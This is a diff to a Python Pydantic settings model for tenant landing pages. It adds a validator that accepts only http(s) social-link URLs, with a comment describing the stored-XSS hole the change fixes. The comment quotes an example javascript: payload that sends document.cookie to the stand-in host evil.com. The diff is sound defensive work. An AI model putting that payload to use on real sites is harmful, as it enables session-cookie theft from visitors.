@@ -208,6 +208,28 @@ class TenantLandingSettings(BaseModel):
     facebook_url: Optional[str] = None
     twitter_url: Optional[str] = None
     linkedin_url: Optional[str] = None
+
+    # SECURITY FIX (institutional-readiness audit, 2026-09, 9th sweep):
+    # these 7 fields had no protocol validation at all — a tenant admin
+    # could set e.g. linkedin_url to "javascript:fetch('https://evil.com/?
+    # c='+document.cookie)", which the public, unauthenticated landing-page
+    # templates (PublicPageView.tsx, PremiumFooter.tsx, and all 3 legacy
+    # HighSchool/University/DefaultLanding templates) rendered straight
+    # into an <a href=...} with no sanitization — a javascript: URI still
+    # executes on click even with target="_blank" rel="noopener
+    # noreferrer" (that combo only blocks window.opener access, not the
+    # URI scheme itself). Fixed on both ends, defense-in-depth: the
+    # frontend now routes every one of these hrefs through the existing
+    # sanitizeUrl() helper (src/lib/sanitize.ts, already used correctly
+    # elsewhere in this codebase but missed on these 5 files), and this
+    # validator rejects anything but http(s):// at the source.
+    @field_validator("facebook", "instagram", "twitter", "youtube",
+                      "facebook_url", "twitter_url", "linkedin_url")
+    @classmethod
+    def _validate_social_link_protocol(cls, v: Optional[str]) -> Optional[str]:
+        if v and not v.strip().lower().startswith(("http://", "https://")):
+            raise ValueError("Le lien doit commencer par http:// ou https://")
+        return v
     features: List[str] = Field(default_factory=list)
     school_motto: Optional[str] = None
     founded_year: Optional[int] = None
